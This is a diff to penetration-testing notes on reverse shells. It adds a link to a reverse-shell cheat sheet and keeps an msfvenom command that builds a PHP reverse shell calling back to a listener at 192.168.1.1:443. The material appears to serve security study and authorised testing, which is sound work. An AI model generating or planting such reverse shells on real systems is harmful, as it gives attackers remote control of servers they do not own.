@@ -34,6 +34,9 @@ https://github.com/samratashok/nishang
 
 PayloadsAllTheThings
 https://github.com/swisskyrepo/PayloadsAllTheThings
+
+Pentestmonkey Cheatsheet
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
 
 ###### List msfvenom payload options
@@ -56,8 +59,7 @@ Staged payload
 ```
 > msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
 
-Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
-> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste > shell.php
+Need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
 ```
 
 ###### .elf reverse shell
